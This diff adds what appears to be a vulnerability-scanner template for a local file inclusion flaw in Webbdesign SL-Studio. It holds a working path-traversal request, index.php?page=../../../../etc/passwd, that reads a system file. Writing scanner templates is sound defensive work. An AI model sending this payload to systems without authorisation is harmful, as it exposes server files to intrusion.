@@ -1,0 +1,19 @@
+id: sl-studio-lfi
+brief:
+    title: Webbdesign SL-Studio - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Webbdesign SL-Studio is vulnerable to local file inclusion.
+    label:
+        - slstudio
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?page=../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
